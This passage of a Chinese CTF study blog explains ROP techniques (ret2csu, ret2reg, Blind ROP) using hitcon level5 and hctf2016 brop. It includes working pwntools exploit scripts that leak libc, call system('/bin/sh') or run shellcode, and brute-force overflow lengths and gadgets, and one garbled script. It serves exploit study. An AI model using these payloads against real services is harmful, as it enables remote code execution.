endp</span><br></pre></td></tr></table></figure></li><li>从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，<strong>但其实此时rdi的高32位寄存器值为0</strong>，<strong>所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数</strong>。<em>比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址</em>。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br></pre></td></tr></table></figure></li><li>从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="type">short</span> loc_400600</span><br></pre></td></tr></table></figure></li></ol><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5">ctf-challenges/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5/level5 at master · ctf-wiki/ctf-challenges</a><br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128110231.png" alt="Pasted image 20250128110231"></p><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128111234.png" alt="Pasted image 20250128111234"></p><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128111505.png" alt="Pasted image 20250128111505"></p><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128111308.png" alt="Pasted image 20250128111308"><br>ida看/cyclic测出栈偏移为<code>0x88=136</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_addr = <span class="number">0x40061a</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">playload = <span class="string">&#x27;A&#x27;</span>*<span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(playload)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_start)</span><br></pre></td></tr></table></figure><blockquote><p>payload解释：<br>首先输入136个字符使程序发生栈溢出，然后让pop_addr覆盖栈中的返回地址，使程序执行pop_addr地址处的函数，并分别将栈中的0、1、write_got函数地址、8、write_got、1分别pop到寄存器rbx、rbp、r12、r13、r14、r15中去，之后将pop函数的返回地址覆盖mov_addr的地址为，如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx <span class="comment">//rbx-&gt; 0</span></span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp <span class="comment">//rbp-&gt; 1</span></span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12 <span class="comment">//r12-&gt; write_got函数地址</span></span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13 <span class="comment">//r13-&gt; 8</span></span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14 <span class="comment">//r14-&gt; write_got函数地址</span></span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15 <span class="comment">//r15-&gt; 1</span></span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn        <span class="comment">//覆盖为mov_addr</span></span><br></pre></td></tr></table></figure><br>两个write_got函数作用:<br>再布置完寄存器后，由于有<code>call qword ptr[r12+rbx*8]</code>它调用了write函数，其参数为<code>write_got</code>函数地址，写成C语言类似于：<code>write(write_got函数地址)==printf（write_got函数地址)</code>，再使用<code>u64(p.recv(8)</code>接受数据并print出来就行了<br>之后程序转向mov_addr函数，利用mov指令布置寄存器rdx，rsi，edi<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13 <span class="comment">//rdx=r13==8</span></span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14 <span class="comment">//rsi==r14==write_got函数地址</span></span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line"><span class="comment">//edi==r15d==1</span></span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>] <span class="comment">//call write_got函数地址</span></span><br><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span> </span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp <span class="comment">//rbx==1,rbp==1</span></span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="type">short</span> loc_400600</span><br></pre></td></tr></table></figure><br>JNZ(或JNE)(jump if not zero, or not equal)，汇编语言中的条件转移指令。结果不为零(或不相等)则转移</p></blockquote><p>这里rbx和rbp都等于1，他们相等，所以继续执行payload代码(main_addr)，而不是去执行loc_400600</p><blockquote><p>从整体上来看，我们输入了<code>&#39;A&#39;*136</code>，利用payload对寄存器布局之后又重新回到了main函数，再说说<code>&#39;a&#39;*(0x8+8*6)</code>的作用：它的作用就是为了<strong>平衡堆栈</strong><br>也就是说，当mov_addr执行完之后，按照流程仍然会执行地址400616处的函数，我们并不希望它执行到这个函数（因为他会再次pop寄存器更换我们布置好的内容），所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（<strong>栈区和代码区同属于内存区域，可以被填充</strong>），如下图所示：<br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128132334.png" alt="Pasted image 20250128132334"><br>用垃圾数据填充地址0x16-0x22的内容，最后将main_addr覆盖ret，从而执行main_addr处的内容</p></blockquote><p>由此我们获得了write的真实地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc=ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">libc_base=write_start-libc.symbols[&#x27;</span>write<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">system_addr=libc.symbols[&#x27;</span>system<span class="string">&#x27;]+libc_base</span></span><br><span class="line"><span class="string">binsh=next(libc.search(&#x27;</span>/<span class="built_in">bin</span>/sh<span class="string">&#x27;))+libc_base</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop_rdi_ret=0x400623</span></span><br><span class="line"><span class="string">payload=&#x27;</span>a<span class="string">&#x27;*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.send(payload)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure><p>当我们获得write函数的真实地址之后，就可以计算出libc文件的基址，从而可以计算出system函数<br>和/bin/sh字符串在内存中的地址，从而利用它。<br>接下来解释一下第二个payload的意思：<br><code>payload=&#39;a&#39;*0x88+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</code><br>当程序重新执行到main函数时，我们利用栈溢出让返回地址被pop_rdi_ret覆盖，从而程序执行pop_rdi_ret。</p><blockquote><p>注意，当我们send payload之后，pop_rdi_ret、binsh和system_addr被送到了栈中，利用gadgets:pop rdi;ret将栈中的binsh地址送往rdi寄存器中（也就是说pop_rdi_ret的参数是地址binsh)，然后将system函数地址覆盖到ret，程序就会执行此system函数。<br><strong>当system函数执行的时候会利用到rdi里的参数</strong></p></blockquote><h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    <span class="comment"># fakeebp=&#x27;b&#x27; * 8</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line"><span class="comment">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span></span><br><span class="line"><span class="comment">## write(1,write_got,8)</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure><h3 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h3><p><code>pop_rdi_ret=0x400623</code><br><em>这个是怎么来的？ida里为什么没有？</em><br><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128140952.png" alt="Pasted image 20250128140952"></p><h4 id="1-ROPgadget"><a href="#1-ROPgadget" class="headerlink" title="1.ROPgadget"></a>1.ROPgadget</h4><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250128140914.png" alt="Pasted image 20250128140914"></p><h4 id="2-看机器码"><a href="#2-看机器码" class="headerlink" title="2.看机器码"></a>2.看机器码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pop rbx---------&gt;<span class="number">5B</span></span><br><span class="line">pop rbp---------&gt;<span class="number">5</span>D</span><br><span class="line">pop r12----------&gt;<span class="number">41</span> <span class="number">5</span>C</span><br><span class="line">pop r13----------&gt;<span class="number">41</span> <span class="number">5</span>D</span><br><span class="line">pop r14----------&gt;<span class="number">41</span> <span class="number">5</span>E</span><br><span class="line">pop r15----------&gt;<span class="number">41</span> <span class="number">5F</span></span><br></pre></td></tr></table></figure><p>xxxxxxxxxx28 1from pwn import <em>2context(os=’linux’, arch=’amd64’, log_level=’debug’)3​4io = process(‘./pwn2’)5elf = ELF(‘./pwn2’)6​7vul = 0x4009E78write = 0x4009DD9​10pop_rdi = 0x4014c611pop_rsi = 0x4015e712pop_rdx = 0x44262613jmp_rsi = 0x4a331314mov_rdi_esi = 0x47a3b315​16payload  = “A”</em>0x8817payload += p64(pop_rsi) + p64(7) + p64(pop_rdi) + p64(elf.sym[‘<strong>stack_prot’]) + p64(mov_rdi_esi)18payload += p64(pop_rdi) + p64(elf.sym[‘</strong>libc_stack_end’]) + p64(elf.sym[‘_dl_make_stack_executable’])19payload += p64(vul)20​21io.sendlineafter(‘welcome~\n’, payload)22​23shellcode = asm(shellcraft.sh())24payload = shellcode.ljust(0x88, “A”) + p64(jmp_rsi)25​26io.sendline(payload)27​28io.interactive()python</p><h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><p>ret2reg，即返回到寄存器地址进行攻击，可以绕过地址混淆（ASLR）。<br>一般用于开启ASLR的ret2shellcode题型，在函数执行后，传入的参数在栈中传给某寄存器，然而该函数在结束前并未将该寄存器复位，就导致这个寄存器仍还保存着参数，当这个参数是shellcode时，只要程序中存在jmp/call reg代码片段时，即可通过gadget跳转至该寄存器执行shellcode。<br>该攻击方法之所以能成功，是因为函数内部实现时，溢出的缓冲区地址通常会加载到某个寄存器上，在后来的运行过程中不会修改。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>查看栈溢出返回时哪个寄存器指向缓冲区空间。</li><li>查找对应的call 寄存器或者jmp 寄存器指令，将EIP设置为该指令地址。</li><li>将寄存器所指向的空间上注入shellcode（确保该空间是可以执行的，通常是栈上的）<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3></li><li>分析和调试汇编，查看溢出函数返回时哪个寄存器指向缓冲区地址</li><li>向寄存器指向的缓冲区中注入shellcode</li><li>查找call 该寄存器或者jmp 该寄存器指令，并将该指令地址覆盖ret<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3>在函数ret之前，将所有赋过值的寄存器全部复位，清0，以避免此类漏洞</li></ul><h2 id="brop"><a href="#brop" class="headerlink" title="brop"></a>brop</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>BROP全称为”BlindROP”</strong>，一般在我们无法获得二进制文件的情况下利用 ROP进行远程攻击某个应用程序，劫持该应用程序的控制流，<strong>我们可以不需要知道该应用程序的源代码或者任何二进制代码</strong>，该应用程序可以被现有的一些保护机制，诸如NX, ASLR, PIE, 以及stack canaries等保护，应用程序所在的服务器可以是32位系统或者64位系统，BROP这一概念在2014年由Standford的Andrea Bittau发表在Oakland 2014的论文Hacking Blind中提出。</p><blockquote><p>论文地址:<a href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">bittau-brop.pdf</a></p></blockquote><h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><ol><li>程序必须存在一个已知的栈溢出漏洞，并且攻击者知道如何触发该漏洞；</li><li>应用程序在crash之后可以重新启动（复活），并且重新启动（复活）的进程不会被re-rand(虽然有ASLR的保护，但是复活的进程和之前的进程的地址随机化是一样的)，这个需求其实在现实中是存在且合理的，诸如像如今的nginx, MySQL, Apache, OpenSSH, Samba等应用均符合此类特性。</li></ol><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ol><li>暴力枚举，获取栈溢出长度，如果程序开启了Canary ，顺便将canary也可以爆出来</li><li>寻找可以<strong>返回到程序main函数的gadget</strong>,通常被称为stop_gadget</li><li>利用stop_gadget寻找可利用(potentially useful)gadgets，如:pop rdi; ret</li><li>寻找BROP Gadget，可能需要诸如write、put等函数的系统调用</li><li>寻找相应的PLT地址</li><li>dump远程内存空间<br>拿到相应的GOT内容后，泄露出libc的内存信息，最后利用rop完成getshell</li></ol><blockquote><p><strong>知识点1-stop_gadget</strong>：一般情况下，如果我们把栈上的return address覆盖成某些我们随意选取的内存地址的话，程序有很大可能性会挂掉（比如，该return address指向了一段代码区域，里面会有一些对空指针的访问造成程序crash，从而使得攻击者的连接（connection）被关闭）。但是，<em>存在另外一种情况，即该return address指向了一块代码区域，当程序的执行流跳到那段区域之后，程序并不会crash，而是进入了无限循环，这时程序仅仅是hang在了那里，攻击者能够一直保持连接状态</em>。于是，我们把这种类型的gadget，成为<strong><em>stop gadget</em></strong>，这种gadget对于寻找其他gadgets取到了至关重要的作用。<br><strong>知识点2-可利用的(potentially useful)gadgets</strong>：假设现在我们猜到某个useful gadget，比如pop rdi; ret, <em>但是由于在执行完这个gadget之后进程还会跳到栈上的下一个地址，如果该地址是一个非法地址，那么进程最后还是会crash</em>，在这个过程中攻击者其实并不知道这个useful gadget被执行过了（因为在攻击者看来最后的效果都是进程crash了），因此攻击者就会认为在这个过程中并没有执行到任何的useful gadget，从而放弃它。这个步骤如下图所示：<img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206185740.png" alt="Pasted image 20250206185740">但是，如果我们有了stop gadget，那么整个过程将会很不一样. 如果我们在需要尝试的return address之后填上了足够多的stop gadgets，如下图所示：<img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206185807.png" alt="Pasted image 20250206185807">那么任何会造成进程crash的gadget最后还是会造成进程crash，而那些useful gadget则会进入block状态。尽管如此，还是有一种特殊情况，即那个我们需要尝试的gadget也是一个stop gadget，那么如上所述，它也会被我们标识为useful gadget。不过这并没有关系，因为之后我们还是需要检查该useful gadget是否是我们想要的gadget。</p></blockquote><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a href="https://github.com/zszcr/ctfrepo/tree/master/BROP/hctf2016-brop-master">ctfrepo/BROP/hctf2016-brop-master at master · zszcr/ctfrepo</a></p><h4 id="解答思路"><a href="#解答思路" class="headerlink" title="解答思路"></a>解答思路</h4><p>做题思路：控制puts函数打印出自身的got表地址，通过got地址利用LibcSearcher计算出当前使用的libc版本，接着找到system函数和/bin/sh地址部署到栈中执行</p><h4 id="解答步骤"><a href="#解答步骤" class="headerlink" title="解答步骤"></a>解答步骤</h4><h5 id="1-判断栈溢出长度"><a href="#1-判断栈溢出长度" class="headerlink" title="1.判断栈溢出长度"></a>1.判断栈溢出长度</h5><p>首先第一步，需要对栈空间进行判断，确定栈溢出的长度。<br>判断栈溢出可以通过循环不断的增加输入字符的长度，直至程序崩溃<br>可以看到我们出现’WelCome my friend,Do you know password?’这个字样之后等待输入，当输入一个a的时候，接下来会提示’No password, no game’的字样<br>同时在我们输入一串特别长的字符串的时候没有出现’No password, no game’的字样，那么我们就可以使用循环来不断增加字符串长度，并且根据回显结果中是否有’No password, no game’字样来判断到什么长度覆盖了ret返回地址，并且<strong>该长度减一就是栈溢出的长度</strong></p><p><strong>循环内容：累加输入字符串长度，填满栈空间</strong><br><strong>循环终止条件：回显结果起始位置字符串为No password, no game</strong><br><strong>执行目的：确定栈溢出长度，为后续所有步骤做准备</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#暴力枚举出栈溢出长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getsize</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">            p.send(i*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data.startswith(<span class="string">b&#x27;No password&#x27;</span>):</span><br><span class="line">            <span class="comment">#判断output变量中起始位置是不是No password，如果不是说明已经溢出了</span></span><br><span class="line">                <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:<span class="comment">#主要探测是否具有canary</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line"> </span><br><span class="line">size = getsize()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;size is : %s &quot;</span>% size)</span><br></pre></td></tr></table></figure><p>根据上面的代码可以确定栈溢出的长度为72，并且根据返回信息发现没有开启canary保护<br>栈中情况：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |           ret             | </span><br><span class="line">             +---------------------------+</span><br><span class="line">             |            a              | 递增a字符串覆盖原saved ebp位置</span><br><span class="line">      ebp---&gt;+---------------------------+</span><br><span class="line">             |            a+             | 递增a字符串占位填满栈空间</span><br><span class="line">             |           ....            |        .....</span><br><span class="line">             |            a+             | 递增a字符串占位填满栈空间</span><br><span class="line">             |            a+             | 递增a字符串占位填满栈空间</span><br><span class="line">             |            a+             | 递增a字符串占位填满栈空间</span><br><span class="line">             |            a+             | 递增a字符串占位填满栈空间</span><br><span class="line">ebp-？--&gt;+---------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h5 id="2-寻找stop-gadget"><a href="#2-寻找stop-gadget" class="headerlink" title="2.寻找stop gadget"></a>2.寻找stop gadget</h5><p>当我们想办法寻找gadget的时候，并不知道程序具体是什么样的，所以需要控制返回地址进而去猜测gadget。那当我们控制返回地址时，一般会出现三种情况</p><ol><li>程序直接崩溃：ret地址指向的是一个程序内不存在的地址</li><li>程序运行一段时间后崩溃：比如运行自己构造的函数，该函数的返回地址指向不存在的地址</li><li>程序一直运行而不崩溃<br>stop gadget一般指的是，但程序执行这段代码时，程序进入无限循环，这样使得攻击者能够一直保持连接状态，并且程序一直运行而不崩溃。就像蛇吃自己的尾巴一样，stop gadget最后的ret结尾地址就是程序开启的地址（比如main函数地址）</li></ol><p>由于看不到二进制程序所以依然还需要使用穷举的方式不断的尝试每一个地址，所以我们从初始的地址0x400000开始，通过循环，不断累加地址进行尝试（前面检测程序保护讲了为什么初始地址是0x400000）。有了循环之后就需要考虑循环终止条件，终止条件可以参考stop gadget的特性，在执行stop gadget的时候程序会回到初始状态并且没有发生崩溃。那么我们可以利用这一特性，使用前面找到的72字节填满栈空间，之后接上穷举的地址，此时穷举地址覆盖了ret地址，那么接下来就会执行穷举地址，如果此时程序发生崩溃就进行下一次循环，如果没有崩溃则打印该地址</p><p><strong>循环内容：递增地址，尝试可能的stop gadget</strong><br><strong>循环终止条件：程序不发生崩溃</strong><br><strong>执行目的：确定stop gadget为后面查找brop gadget、puts plt、puts got做准备</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop</span>():</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now,trying the address is &quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">            p = process(<span class="string">&#x27;./brop&#x27;</span>)</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;WelCome my friend,Do you know password?\n&quot;</span>)</span><br><span class="line">            payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> + p64(addr)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Now,the payload is &quot;</span>,payload)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;WelCome&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;main funciton--&gt;[%s]&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&#x27;one success addr : 0x%x&#x27;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;a bad addr&quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Can&#x27;t connect,retrying&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">data = get_stop()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Success,call Main Function address is&quot;</span>,<span class="built_in">hex</span>(data))</span><br></pre></td></tr></table></figure><p><img src="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/Pasted image 20250206201043.png" alt="Pasted image 20250206201043"><br>我们也可以用IDA(仅作验证，brop理应无文件)，可知该地址为main函数</p><h5 id="3-寻找brop-gadget"><a href="#3-寻找brop-gadget" class="headerlink" title="3.寻找brop gadget"></a>3.寻找brop gadget</h5><p>在前面找到了stop gadget我们怎么去利用他呢，这时候就需要找到能够控制寄存器的gadget。由于我们的计划是利用puts函数打印出自己的got地址，通过got地址找到对应的libc版本，然后找到system函数和/bin/sh地址部署到栈中执行。那么需要考虑的一点是在调用puts函数之前需要将打印的内容压进rdi寄存器中，那么我们首先就需要通过gadget来控制rdi寄存器。<br>其实在libc_csu_init的结尾一长串pop的gadget中，通过偏移可以得到pop rdi的操作</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+---------------------------+  </span><br><span class="line">|         pop rbx           |  <span class="number">0x00</span></span><br><span class="line">+---------------------------+</span><br><span class="line">|         pop rbp           |  <span class="number">0x01</span></span><br><span class="line">+---------------------------+</span><br><span class="line">|         pop r12           |  <span class="number">0x02</span></span><br><span class="line">+---------------------------+</span><br><span class="line">|         pop r13           |  <span class="number">0x04</span></span><br><span class="line">+---------------------------+</span><br><span class="line">|         pop r14           |  <span class="number">0x06</span></span><br><span class="line">+---------------------------+----------&gt;pop rsi;ret <span class="number">0x07</span></span><br><span class="line">|         pop r15           |  <span class="number">0x08</span></span><br><span class="line">+---------------------------+----------&gt;pop rdi;ret <span class="number">0x09</span></span><br><span class="line">|           ret             |  <span class="number">0x10</span></span><br><span class="line">-----------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到如果以pop rbx为基地址的话向下偏移0x07会得到pop rsi的操作，向下偏移0x09会得到pop rdi的操作。这两个操作就可以帮助我们控制puts函数的输出内容</p><p>那么往回想既然我们需要用到pop rdi、rsi的操作就需要知道libc_csu_init结尾6个pop操作的位置。这个时候我们的stop gadget就派上用场了，为了更好地演示stop gadget的使用，这里定义栈上的三种地址</p><ul><li>Probe - - 探针，也就是我们想要循环递增的代码地址。一般来说都是64位程序，可以直接从0x400000尝试</li><li>Stop - - 不会使得程序崩溃的stop gadget的地址</li><li>Trap - - 可以导致程序崩溃的地址</li></ul><p>我们可以通过在栈上拜访不同程序的Stop与Trap从而来识别出正在执行的指令，举几个例子</p><ul><li>probe, stop, traps, (traps, traps, …)以这样的方式进行排列，可以看一下在栈中的排列<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">+---------------------------+ </span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           ....            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            |&lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          stop             |&lt;----- stop gadget，不会使程序崩溃，作为probe的ret位</span><br><span class="line">+---------------------------+</span><br><span class="line">|          probe            |&lt;----- 探针</span><br><span class="line">-----------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>我们可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样布局的情况下，如果程序没有崩溃，说明stop gadget被执行了。<strong>说明了probe探针中没有pop操作，并且有ret返回</strong>，如果有pop操作的话stop会被pop进寄存器当中，那么probe探针的ret返回就会指向stop的后几位traps，那么就会导致程序崩溃。那么由于在栈布局中stop gadget在probe探针的下一位，说明stop所在位置就是probe探针的ret返回地址位置。如：<figure class="highlight 